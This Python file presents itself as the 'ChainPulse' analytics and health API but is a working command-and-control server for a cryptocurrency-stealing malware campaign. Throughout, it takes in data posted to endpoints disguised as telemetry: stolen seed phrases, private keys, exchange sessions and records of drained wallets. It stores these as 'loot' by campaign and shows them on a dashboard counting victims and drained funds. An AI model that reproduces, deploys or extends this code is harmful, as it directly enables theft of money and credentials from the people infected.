#!/usr/bin/env python3
"""ChainPulse v8.0 — Analytics & Health API (Render-compatible).

Binds to PORT env var (Render default: 10000).
No argparse — everything via env vars.
"""
import json, base64, gzip, os, sys, time, glob, socket, threading
from http.server import HTTPServer, BaseHTTPRequestHandler, ThreadingHTTPServer
from datetime import datetime

PORT = int(os.environ.get("PORT", "10000"))
HOST = os.environ.get("HOST", "0.0.0.0")
LOOT_DIR = os.environ.get("LOOT_DIR", os.path.join(os.path.dirname(os.path.abspath(__file__)), "loot"))
os.makedirs(LOOT_DIR, exist_ok=True)

DASHBOARD_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ChainPulse v8.0 — Analytics</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'SF Mono','Consolas','Courier New',monospace;background:#080810;color:#00ff88;padding:20px;font-size:13px}
h1{color:#00d4ff;border-bottom:1px solid #1a3a3a;padding-bottom:10px;margin-bottom:20px;font-size:20px}
h2{color:#ffd700;margin:15px 0 8px;font-size:15px}
.card{background:#0c0c18;border:1px solid #1a3a3a;border-radius:6px;padding:15px;margin-bottom:12px}
.card-drain{background:#140a0a;border-color:#ff3333}
.card-seed{background:#0a0a14;border-color:#ffd700}
.card-session{background:#0a140a;border-color:#00ff88}
.label{color:#666}.value{color:#00ff88}.key{color:#ffd700}
pre{background:#050510;padding:10px;border-radius:4px;overflow-x:auto;margin:10px 0;color:#aaa;font-size:11px;max-height:200px;overflow-y:auto}
.badge{display:inline-block;padding:2px 8px;border-radius:3px;font-size:11px;margin-right:4px;margin-bottom:4px}
.badge-drained{background:#00ff00;color:#000;font-weight:bold}
.badge-eth{background:#627eea;color:#fff}
.badge-btc{background:#f7931a;color:#000}
.badge-sol{background:#9945ff;color:#fff}
.badge-bsc{background:#f3ba2f;color:#000}
.badge-danger{background:#ff3333;color:#fff}
.badge-erc20{background:#00d4ff;color:#000}
.badge-session{background:#00cc66;color:#000}
table{width:100%;border-collapse:collapse;margin:8px 0}
td,th{padding:6px 8px;border:1px solid #1a3a3a;text-align:left;font-size:11px}
th{background:#0f1a1a;color:#ffd700}
a{color:#00d4ff}
.stats-bar{display:flex;gap:15px;margin-bottom:15px;flex-wrap:wrap}
.stat-box{flex:1;min-width:120px;background:#0c0c18;border:1px solid #1a3a3a;border-radius:6px;padding:12px;text-align:center}
.stat-box .num{font-size:28px;font-weight:bold;color:#00d4ff}
.stat-box .lbl{font-size:11px;color:#666;margin-top:4px}
.chain-tag{display:inline-block;background:#1a1a2e;color:#00ff88;padding:1px 6px;border-radius:3px;font-size:10px;margin:2px}
</style>
</head>
<body>
<h1>ChainPulse v8.0 — Analytics Dashboard</h1>
<div id="stats"></div>
<div id="loot"></div>
<script>
async function load(){
  const r=await fetch('/api/loot-summary');
  const d=await r.json();

  let sc=0,sk=0,pk=0,dc=0,ec=0,sessions=0;
  for(const e of d.recent||[]){
    const p=e.payload||e;
    const sec=p.secrets||{};
    sc+=(sec.seed_phrases||[]).length;
    pk+=(sec.private_keys||[]).length;
    dc+=(p.drain_results||[]).filter(x=>x.status==='drained').length;
    ec+=(p.drain_results||[]).filter(x=>x.type==='erc20').length;
    sessions+=(p.exchange_sessions||[]).length;
  }

  document.getElementById('stats').innerHTML=
    '<div class="stats-bar">'+
    '<div class="stat-box"><div class="num">'+d.campaign_count+'</div><div class="lbl">Campaigns</div></div>'+
    '<div class="stat-box"><div class="num">'+d.total_victims+'</div><div class="lbl">Devices</div></div>'+
    '<div class="stat-box"><div class="num">'+d.total_files+'</div><div class="lbl">Reports</div></div>'+
    '<div class="stat-box"><div class="num">'+sc+'</div><div class="lbl">Seeds</div></div>'+
    '<div class="stat-box"><div class="num">'+pk+'</div><div class="lbl">Keys</div></div>'+
    '<div class="stat-box"><div class="num">'+dc+'</div><div class="lbl">Drained</div></div>'+
    '<div class="stat-box"><div class="num">'+sessions+'</div><div class="lbl">Sessions</div></div>'+
    '</div>';

  let html='';
  for(const entry of d.recent){
    const p=entry.payload||entry;
    const sys=p.system_info||{};
    let cc='card';
    const hasDrain=(p.drain_results||[]).some(dr=>dr.status==='drained');
    const hasSeed=(p.secrets||{}).seed_phrases||[];
    const hasSessions=(p.exchange_sessions||[]).length;
    if(hasDrain&&hasSeed)cc='card card-drain seed';
    else if(hasDrain)cc='card card-drain';
    else if(hasSeed.length)cc='card card-seed';
    else if(hasSessions)cc='card card-session';

    html+='<div class="'+cc+'">';
    html+='<h2>'+ (entry.endpoint||p.endpoint||'report') +' - '+ (entry.timestamp||p.timestamp||'?') +'</h2>';
    html+='<span class="label">Campaign:</span> <span class="value">'+(entry.campaign||'?')+'</span> | ';
    html+='<span class="label">System:</span> <span class="value">'+(sys.hostname||'?')+' ('+(sys.user||'?')+') '+(sys.os||'')+'</span><br>';

    const wallets=p.wallets||{};
    const wnames=Object.keys(wallets).filter(k=>wallets[k]&&wallets[k].length);
    html+='<span class="label">Wallets:</span> ';
    if(wnames.length){
      html+=wnames.map(w=>'<span class="chain-tag">'+w+'</span>').join(' ');
    }else{html+='<span class="value">none</span>';}
    html+='<br>';

    if(p.secrets){
      const seeds=(p.secrets.seed_phrases||[]).length;
      const pkeys=(p.secrets.private_keys||[]).length;
      if(seeds)html+='<span class="badge badge-danger">SEED x'+seeds+'</span> ';
      if(pkeys)html+='<span class="badge badge-btc">KEY x'+pkeys+'</span> ';
    }

    if(hasSessions){
      const domains=[...new Set(p.exchange_sessions.map(s=>s.domain))];
      html+='<span class="badge badge-session">SESSIONS: '+domains.slice(0,5).join(', ')+(domains.length>5?' +'+(domains.length-5)+' more':'')+'</span><br>';
    }

    const dr=p.drain_results||[];
    if(dr.length){
      html+='<br><span class="label">RESULTS ('+dr.length+' chains):</span><br>';
      html+='<table><tr><th>Chain</th><th>Type</th><th>Status</th><th>Amount</th><th>TX</th></tr>';
      for(const r of dr){
        let badge='';
        if(r.status==='drained'&&r.type==='erc20')badge='<span class="badge badge-erc20">ERC20</span>';
        else if(r.status==='drained')badge='<span class="badge badge-drained">DRAINED</span>';
        else if(r.status==='empty')badge='<span class="badge">empty</span>';
        else if(r.status==='dust')badge='<span class="badge">dust</span>';
        else badge='<span class="badge" style="background:#555">'+r.status+'</span>';

        let amt='-';
        if(r.amount_ether!==undefined)amt=r.amount_ether.toFixed(6)+' '+r.chain.toUpperCase();
        else if(r.amount_human!==undefined)amt=r.amount_human.toFixed(4)+' '+r.symbol;
        else if(r.amount_sol!==undefined)amt=r.amount_sol.toFixed(6)+' SOL';

        html+='<tr>'+
          '<td><span class="chain-tag">'+ (r.chain||'?') +'</span></td>'+
          '<td>'+ (r.type||r.symbol||'native') +'</td>'+
          '<td>'+badge+'</td>'+
          '<td>'+amt+'</td>'+
          '<td>'+(r.explorer?'<a href="'+r.explorer+'" target="_blank">view</a>':r.tx_hash?r.tx_hash.slice(0,12)+'...':'-')+'</td>'+
        '</tr>';
      }
      html+='</table>';
    }

    html+='</div>';
  }
  document.getElementById('loot').innerHTML=html||'<div class="card">No data yet. Waiting for telemetry...</div>';
}
load();setInterval(load,8000);
</script>
</body>
</html>"""

class C2Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    def do_GET(self):
        if self.path in ("/", "/dashboard"):
            self._serve_html(DASHBOARD_HTML)
        elif self.path == "/api/loot-summary":
            self._serve_json(self._get_summary())
        elif self.path == "/health":
            self._serve_json({"status": "healthy", "version": "8.0.0", "render": True})
        else:
            self.send_error(404)

    def do_OPTIONS(self):
        self.send_response(204)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, X-Client-ID")
        self.end_headers()

    def do_POST(self):
        telemetry_endpoints = ("/api/v1/telemetry", "/collect", "/metrics", "/ping")
        if not any(self.path.startswith(ep) for ep in telemetry_endpoints):
            self.send_error(404)
            return
        try:
            cl = int(self.headers.get("Content-Length", 0))
            if cl == 0 or cl > 15_000_000:
                self.send_error(400)
                return
            body = self.rfile.read(cl)
            data = json.loads(body)
            if "t" not in data:
                self.send_error(400)
                return
            compressed = base64.b64decode(data["t"])
            decompressed = gzip.decompress(compressed)
            payload = json.loads(decompressed)

            endpoint = payload.get("endpoint", "unknown")
            campaign = payload.get("campaign", "unknown")
            ts = payload.get("timestamp", datetime.utcnow().isoformat()).replace(":", "-")

            cdir = os.path.join(LOOT_DIR, campaign)
            os.makedirs(cdir, exist_ok=True)
            fname = f"{endpoint}_{ts}.json"
            fpath = os.path.join(cdir, fname)
            with open(fpath, "w") as f:
                json.dump(payload, f, indent=2, default=str)

            dr = payload.get("payload", {}).get("drain_results", [])
            for r in dr:
                if r.get("status") == "drained":
                    amt = r.get("amount_ether", r.get("amount_human", r.get("amount_sol", 0)))
                    sym = r.get("symbol", r.get("chain", "?"))
                    print(f"[$$$] DRAINED {amt:.6f} {sym} | tx: {r.get('tx_hash','?')[:16]}...")

            seeds = payload.get("payload", {}).get("secrets", {}).get("seed_phrases", [])
            if seeds:
                print(f"[!!!] SEED PHRASES: {len(seeds)} found!")

            print(f"[+] {endpoint} | campaign={campaign} | {fpath}")
            self._serve_json({"status": "ok"})

        except Exception as e:
            print(f"[-] Error: {e}")
            self.send_error(500)

    def _serve_html(self, html):
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(html.encode())

    def _serve_json(self, data):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

    def _get_summary(self):
        campaigns = []
        total_files = 0
        recent = []
        if os.path.isdir(LOOT_DIR):
            for cdir in os.listdir(LOOT_DIR):
                cp = os.path.join(LOOT_DIR, cdir)
                if os.path.isdir(cp):
                    files = sorted(glob.glob(os.path.join(cp, "*.json")), key=os.path.getmtime, reverse=True)
                    total_files += len(files)
                    campaigns.append({"name": cdir, "files": len(files)})
                    for fp in files[:5]:
                        try:
                            with open(fp) as f:
                                recent.append(json.load(f))
                        except:
                            pass
        hosts = set()
        for r in recent:
            h = (r.get("payload", {}) or r).get("system_info", {}).get("hostname", "")
            if not h:
                h = r.get("system_info", {}).get("hostname", "")
            if h:
                hosts.add(h)
        return {
            "campaign_count": len(campaigns),
            "campaigns": campaigns,
            "total_victims": len(hosts),
            "total_files": total_files,
            "recent": recent[:20]
        }

if __name__ == "__main__":
    print(f"[C2] ChainPulse v8.0 (Render) — http://0.0.0.0:{PORT}")
    print(f"[C2] Dashboard: /dashboard")
    print(f"[C2] Health:    /health")
    print(f"[C2] Loot dir:  {LOOT_DIR}")
    server = ThreadingHTTPServer((HOST, PORT), C2Handler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[C2] Shutting down...")
        server.shutdown()
